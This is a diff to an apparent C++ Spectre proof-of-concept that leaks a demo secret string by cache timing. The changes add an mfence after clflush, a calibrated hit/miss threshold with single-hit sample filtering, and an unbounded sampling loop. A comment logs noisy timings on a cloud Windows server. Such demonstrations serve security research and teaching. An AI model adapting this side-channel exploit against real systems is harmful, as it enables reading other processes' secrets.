@@ -50,6 +50,23 @@ const std::string_view private_data = "It's a s3kr3t!!!";
 static void force_read(void *p) { (void)*(volatile char *)p; }
 
 static int64_t get_timestamp() {
+  // TODO this time measurement technique does not work on Google Cloud.
+  // I'm getting basically just garbage (in Visual Studio on Windows Server):
+  // read durations: 600 300 200 200 100 100 500 200 200 200 900 300 200 300 200
+  // 200 200 400 300 300 500 200 200 300 300 300 300 200 300 300 200 300 200 400
+  // 200 200 600 300 300 200 200 300 200 200 200 200 200 200 200 400 200 600 200
+  // 200 200 100 100 400 200 200 200 200 300 300 200 400 200 300 600 300 200 300
+  // 300 800 300 200 300 200 200 300 200 400 300 200 200 300 300 200 300 400 200
+  // 200 200 200 300 200 200 400 200 400 300 200 600 200 300 400 200 300 200 300
+  // 300 200 200 700 200 300 300 300 300 200 200 300 200 200 400 200 200 200 200
+  // 400 200 200 200 200 400 100 200 400 300 200 200 400 200 200 200 400 200 300
+  // 200 300 200 300 200 300 200 200 400 200 200 300 200 300 300 400 200 300 600
+  // 200 300 200 300 200 200 100 200 200 200 300 300 300 400 200 200 300 300 700
+  // 300 200 200 200 200 200 200 700 400 200 300 200 300 200 200 400 500 200 300
+  // 300 300 300 200 400 200 200 300 300 300 300 200 300 200 300 200 200 200 1300
+  // 300 400 300 200 300 300 300 200 300 300 300 200 300 300 300 300 200 300 300
+  // 200 100 200 200 200 400 800 200 300 200 200 300 300
+  // safe offset (verified hit): 300
   return std::chrono::duration_cast<std::chrono::nanoseconds>(
              std::chrono::high_resolution_clock::now().time_since_epoch())
       .count();
@@ -133,14 +150,21 @@ static char leak_byte(std::string_view text, int offset) {
   std::array<int, 256> scores = {};
   int best_val = 0, runner_up_val = 0;
 
-  for (int run = 0; run < 1000; ++run) {
+  for (int run = 0;; ++run) {
     // Flush out entries from the timing array. Now, if they are loaded during
     // speculative execution, that will warm the cache for that entry, which
     // can be detected later via timing analysis.
-    // Note that clflush is not ordered with respect to reads, so it may be
-    // necessary to place a fence here or otherwise ensure that the clflushes
-    // retire before the force_read call below.
     for (int i = 0; i < 256; ++i) _mm_clflush(&isolated_oracle[i]);
+    // Clflush is not ordered with respect to reads, so it is necessary to place
+    // the mfence instruction here so that the clflushes retire before the
+    // force_read calls below.
+    // "Performs a serializing operation on all load-from-memory and
+    // store-to-memory instructions that were issued prior the MFENCE
+    // instruction. This serializing operation guarantees that every load and
+    // store instruction that precedes the MFENCE instruction in program order
+    // becomes globally visible before any load or store instruction that
+    // follows the MFENCE instruction."
+    _mm_mfence();
 
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
@@ -188,8 +212,24 @@ static char leak_byte(std::string_view text, int offset) {
     }
     int64_t avg_latency =
         std::accumulate(latencies.begin(), latencies.end(), 0) / 256;
+
+    // The difference between a cache-hit and cache-miss times is significantly
+    // different across platforms. Therefore we must first compute its estimate
+    // using the safe_offset which should be a cache-hit.
+    int64_t hitmiss_diff = avg_latency - latencies[data[safe_offset]];
+    int hitcount = 0;
     for (int i = 0; i < 256; ++i) {
-      if (latencies[i] < avg_latency && i != data[safe_offset]) ++scores[i];
+      if (latencies[i] < avg_latency - hitmiss_diff / 2 &&
+          i != data[safe_offset]) ++hitcount;
+    }
+
+    // If there is not exacly one hit, we consider that sample invalid and skip
+    // it.
+    if (hitcount == 1) {
+      for (int i = 0; i < 256; ++i) {
+        if (latencies[i] < avg_latency - hitmiss_diff / 2 &&
+            i != data[safe_offset]) ++scores[i];
+      }
     }
 
     std::tie(best_val, runner_up_val) = top_two_indices(scores);
@@ -201,6 +241,12 @@ static char leak_byte(std::string_view text, int offset) {
       break;
     // Otherwise: if we still don't know with high confidence, we can keep
     // accumulating timing data until we think we know the value.
+    if (run > 100000) {
+      std::cerr << "Does not converge " << best_val << " " << scores[best_val]
+                << " " << runner_up_val << " " << scores[runner_up_val]
+                << std::endl;
+      exit(EXIT_FAILURE);
+    }
   }
   return best_val;
 }
